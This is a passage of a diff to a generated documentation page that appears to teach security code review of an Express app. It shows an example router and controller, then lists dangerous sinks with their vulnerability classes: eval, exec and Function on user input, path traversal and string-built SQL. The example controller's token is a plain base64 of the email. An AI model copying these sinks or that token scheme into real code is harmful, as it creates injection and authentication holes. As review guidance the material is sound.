+<span class="normal">21</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><span class="c1">// ===== Requirements =====</span>
+</span><span id="__span-2-2">
+</span><span id="__span-2-3"><span class="c1">// Import required libraries</span>
+</span><span id="__span-2-4"><span class="kd">const</span><span class="w"> </span><span class="nx">express</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+</span><span id="__span-2-5"><span class="kd">const</span><span class="w"> </span><span class="nx">router</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
+</span><span id="__span-2-6">
+</span><span id="__span-2-7"><span class="c1">// Import getUserToken function from &#39;../controllers/auth-controller&#39;</span>
+</span><span id="__span-2-8"><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">getUserToken</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../controllers/auth-controller&#39;</span><span class="p">);</span>
+</span><span id="__span-2-9"><span class="c1">// ========================</span>
+</span><span id="__span-2-10">
+</span><span id="__span-2-11"><span class="c1">// ===== Define endpoints =====</span>
+</span><span id="__span-2-12">
+</span><span id="__span-2-13"><span class="c1">// This router is mounted at /api/auth in the entry point</span>
+</span><span id="__span-2-14"><span class="c1">// so this becomes: POST /api/auth/authenticate</span>
+</span><span id="__span-2-15"><span class="c1">// When a matching request arrives, Express calls getUserToken(req, res)</span>
+</span><span id="__span-2-16"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&quot;/authenticate&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">getUserToken</span><span class="p">);</span>
+</span><span id="__span-2-17"><span class="c1">// ============================</span>
+</span><span id="__span-2-18">
+</span><span id="__span-2-19"><span class="c1">// ===== export router =====</span>
+</span><span id="__span-2-20"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">router</span><span class="p">;</span>
+</span><span id="__span-2-21"><span class="c1">// =========================</span>
+</span></code></pre></div></td></tr></table></div>
+<p>To trace to the controller file CTRL/CMD + click on either:
+- <code>getUserToken</code> (the variable)
+- <code>'../controllers/auth-controller'</code> (the path string)</p>
+<h3 id="example-controller-controllersauth-controllerjs">Example controller (<code>controllers/auth-controller.js</code>)</h3>
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><span class="c1">// ===== controller function =====</span>
+</span><span id="__span-3-2">
+</span><span id="__span-3-3"><span class="kd">function</span><span class="w"> </span><span class="nx">getUserToken</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-4">
+</span><span id="__span-3-5"><span class="w">    </span><span class="c1">// User input from parsed JSON body</span>
+</span><span id="__span-3-6"><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">email</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+</span><span id="__span-3-7">
+</span><span id="__span-3-8"><span class="w">    </span><span class="c1">// Business logic here (validate email, create token, etc.)</span>
+</span><span id="__span-3-9"><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Buffer</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">email</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span>
+</span><span id="__span-3-10">
+</span><span id="__span-3-11"><span class="w">    </span><span class="c1">// Set body and send JSON response (status defaults to 200)</span>
+</span><span id="__span-3-12"><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">token</span><span class="o">:</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="p">});</span>
+</span><span id="__span-3-13"><span class="p">}</span>
+</span><span id="__span-3-14"><span class="c1">// ===============================</span>
+</span><span id="__span-3-15">
+</span><span id="__span-3-16"><span class="c1">// ===== export function =====</span>
+</span><span id="__span-3-17"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">getUserToken</span><span class="w"> </span><span class="p">};</span>
+</span><span id="__span-3-18"><span class="c1">// ===========================</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="4-shortlist-interesting-code">4. Shortlist interesting code</h2>
+<p>Look for dangerous patterns:
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><span class="nb">eval</span><span class="p">(</span><span class="nx">userInput</span><span class="p">);</span><span class="w">                  </span><span class="c1">// code execution</span>
+</span><span id="__span-4-2"><span class="nx">exec</span><span class="p">(</span><span class="nx">userInput</span><span class="p">);</span><span class="w">                  </span><span class="c1">// command injection</span>
+</span><span id="__span-4-3"><span class="nb">Function</span><span class="p">(</span><span class="nx">userInput</span><span class="p">)();</span><span class="w">            </span><span class="c1">// also code execution</span>
+</span><span id="__span-4-4"><span class="nb">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">untrustedData</span><span class="p">);</span><span class="w">        </span><span class="c1">// potential prototype pollution / deserialization</span>
+</span><span id="__span-4-5"><span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="nx">userInput</span><span class="p">);</span><span class="w">           </span><span class="c1">// path traversal</span>
+</span><span id="__span-4-6"><span class="nx">db</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="sb">`SELECT * FROM users WHERE id = </span><span class="si">${</span><span class="nx">userInput</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span><span class="w">  </span><span class="c1">// SQL injection</span>
+</span></code></pre></div></td></tr></table></div></p>
+<h2 id="5-check-dependencies-for-vulnerabilities">5. Check dependencies for vulnerabilities</h2>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1">npm<span class="w"> </span>audit
+</span></code></pre></div></td></tr></table></div>
 
 
 
@@ -2385,10 +2460,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
     
   </body>
